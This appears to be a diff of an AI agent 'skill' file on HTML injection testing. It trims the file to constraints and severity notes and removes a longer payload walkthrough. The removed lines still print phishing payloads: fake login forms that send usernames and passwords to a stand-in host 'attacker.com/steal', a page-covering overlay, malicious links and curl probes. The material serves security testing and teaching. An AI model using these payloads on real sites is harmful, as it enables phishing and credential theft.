@@ -3,7 +3,7 @@ name: html-injection-testing
 description: Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create 
 category: Security & Systems
 source: antigravity
-tags: [python, javascript, api, ai, agent, workflow, document, image, security, vulnerability]
+tags: [ai, workflow, security, vulnerability]
 url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/html-injection-testing
 ---
 
@@ -26,9 +26,9 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/html
 
 # HTML Injection Testing
 
-## Purpose
+## Detailed Guide
 
-Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.
+Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.
 
 ## Prerequisites
 
@@ -44,147 +44,25 @@ Identify and exploit HTML injection vulnerabilities that allow attackers to inje
 - Web application input handling
 - Difference between HTML injection and XSS
 
-## Outputs and Deliverables
+## Constraints and Limitations
 
-1. **Vulnerability Report** - Identified injection points
-2. **Exploitation Proof** - Demonstrated content manipulation
-3. **Impact Assessment** - Potential phishing and defacement risks
-4. **Remediation Guidance** - Input validation recommendations
+### Attack Limitations
+- Modern browsers may sanitize some injections
+- CSP can prevent inline styles and scripts
+- WAFs may block common payloads
+- Some applications escape output properly
 
-## Core Workflow
+### Testing Considerations
+- Distinguish between HTML injection and XSS
+- Verify visual impact in browser
+- Test in multiple browsers
+- Check for stored vs reflected
 
-### Phase 1: Understanding HTML Injection
+### Severity Assessment
+- Lower severity than XSS (no script execution)
+- Higher impact when combined with phishing
+- Consider defacement/reputation damage
+- Evaluate credential theft potential
 
-HTML injection occurs when user input is reflected in web pages without proper sanitization:
-
-```html
-<!-- Vulnerable code example -->
-<div>
-    Welcome, <?php echo $_GET['name']; ?>
-</div>
-
-<!-- Attack input -->
-?name=<h1>Injected Content</h1>
-
-<!-- Rendered output -->
-<div>
-    Welcome, <h1>Injected Content</h1>
-</div>
-```
-
-Key differences from XSS:
-- HTML injection: Only HTML tags are rendered
-- XSS: JavaScript code is executed
-- HTML injection is often stepping stone to XSS
-
-Attack goals:
-- Modify website appearance (defacement)
-- Create fake login forms (phishing)
-- Inject malicious links
-- Display misleading content
-
-### Phase 2: Identifying Injection Points
-
-Map application for potential injection surfaces:
-
-```
-1. Search bars and search results
-2. Comment sections
-3. User profile fields
-4. Contact forms and feedback
-5. Registration forms
-6. URL parameters reflected on page
-7. Error messages
-8. Page titles and headers
-9. Hidden form fields
-10. Cookie values reflected on page
-```
-
-Common vulnerable parameters:
-```
-?name=
-?user=
-?search=
-?query=
-?message=
-?title=
-?content=
-?redirect=
-?url=
-?page=
-```
-
-### Phase 3: Basic HTML Injection Testing
-
-Test with simple HTML tags:
-
-```html
-<!-- Basic text formatting -->
-<h1>Test Injection</h1>
-<b>Bold Text</b>
-<i>Italic Text</i>
-<u>Underlined Text</u>
-<font color="red">Red Text</font>
-
-<!-- Structural elements -->
-<div style="background:red;color:white;padding:10px">Injected DIV</div>
-<p>Injected paragraph</p>
-<br><br><br>Line breaks
-
-<!-- Links -->
-<a href="http://attacker.com">Click Here</a>
-<a href="http://attacker.com">Legitimate Link</a>
-
-<!-- Images -->
-<img src="http://attacker.com/image.png">
-<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
-```
-
-Testing workflow:
-```bash
-# Test basic injection
-curl "http://target.com/search?q=<h1>Test</h1>"
-
-# Check if HTML renders in response
-curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
-
-# Test in URL-encoded form
-curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
-```
-
-### Phase 4: Types of HTML Injection
-
-#### Stored HTML Injection
-
-Payload persists in database:
-
-```html
-<!-- Profile bio injection -->
-Name: John Doe
-Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
-     <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
-     </div>
-
-<!-- Comment injection -->
-Great article!
-<form action="http://attacker.com/steal" method="POST">
-    <input name="username" placeholder="Session expired. Enter username:">
-    <input name="password" type="password" placeholder="Password:">
-    <input type="submit" value="Login">
-</form>
-```
-
-#### Reflected GET Injection
-
-Payload in URL parameters:
-
-```html
-<!-- URL injection -->
-http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
-
-<!-- Search result injection -->
-http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
-```
-
-#### Reflected POST Inject
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
